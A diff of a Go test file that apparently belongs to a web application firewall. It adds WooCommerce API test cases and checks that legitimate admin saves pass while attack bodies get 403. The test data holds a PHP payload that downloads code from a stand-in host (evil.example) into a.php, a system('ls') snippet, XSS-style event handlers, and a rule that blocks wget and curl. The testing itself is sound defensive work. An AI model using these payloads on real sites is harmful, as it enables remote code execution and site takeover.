@@ -174,6 +174,8 @@ func TestAdminAreaSavesWithoutRuleRemoval(t *testing.T) {
 	template := "jform%5Bemail_body%5D=" + urlEncode(`<p onclick="track()">Your membership is active.</p><script>window.dataLayer=window.dataLayer||[];</script>`)
 	file := "content=" + urlEncode(`<?php defined('_JEXEC') or die; echo '<script src="/media/site.js"></script>'; system('ls'); ?>`)
 	token := "0123456789abcdef0123456789abcdef=1"
+	ck, cs := "ck_"+strings.Repeat("0a", 20), "cs_"+strings.Repeat("1b", 20)
+	product := "name=" + urlEncode("Men leather shoes") + "&description=" + urlEncode(`<p onclick="zoom()">Soft leather</p><img src="a.jpg" onerror="this.style.display='none'"><script>var sku='CJ123';</script>`)
 	htmaker := "task=apply&custhead=" + urlEncode("RewriteCond %{HTTP_USER_AGENT} (wget|curl|python-requests|libwww-perl) [NC]\nRewriteRule .* - [F]") +
 		"&exceptionfiles=" + urlEncode("administrator/components/com_akeebabackup/restore.php\nkickstart.php") +
 		"&exceptiondirs=" + urlEncode("cli\nbin\ntmp") + "&httpsurls=&cgibin=" + urlEncode("/usr/local/cgi-bin/php.cgi") +
@@ -220,7 +222,13 @@ func TestAdminAreaSavesWithoutRuleRemoval(t *testing.T) {
 		{"A token-shaped field on the front end", "joomla.example.ir", "/index.php?option=com_content&view=featured&format=feed",
 			"x=" + urlEncode(`{source}<?=file_put_contents('a.php',file_get_contents('https://evil.example/x'));?>{/source}`) + "&" + token, nil, 403},
 		{"A token-shaped field in another admin file", "joomla.example.ir", "/administrator/components/com_x/upload.php", htmaker + "&" + token, nil, 403},
-		{"An attack tool posting to the administrator with a token-shaped field", "joomla.example.ir", "/administrator/index.php", attack + "&" + token, nil, 403},
+		{"An attack tool posting to the administrator with a token-shaped field", "joomla.example.ir", "/administrator/index.php", attack + "&" + token, nil, 403}, // ssshoesmaker.com (business900, 2026-10-30/31): CJdropshipping's
+		// product listing refused as XSS (941100, 941160).
+		{"WooCommerce API product write with keys", "shop.example.pk", "/wp-json/wc/v3/products?consumer_key=" + ck + "&consumer_secret=" + cs, product, nil, 200},
+		{"WooCommerce API batch with OAuth keys", "shop.example.pk", "/wp-json/wc/v3/products/batch?oauth_consumer_key=" + ck + "&oauth_signature=abc", product, nil, 200},
+		{"The same without keys", "shop.example.pk", "/wp-json/wc/v3/products", product, nil, 403},
+		{"Keys on another route", "shop.example.pk", "/wp-json/wp/v2/users?consumer_key=" + ck, attack, nil, 403},
+		{"An attack with keys", "shop.example.pk", "/wp-json/wc/v3/products?consumer_key=" + ck, attack, nil, 403},
 	}
 	for _, c := range cases {
 		if got := sendBody(t, c.host, "POST", c.uri, form, c.body, c.hdr...); (got == 403) != (c.want == 403) || got == 0 {
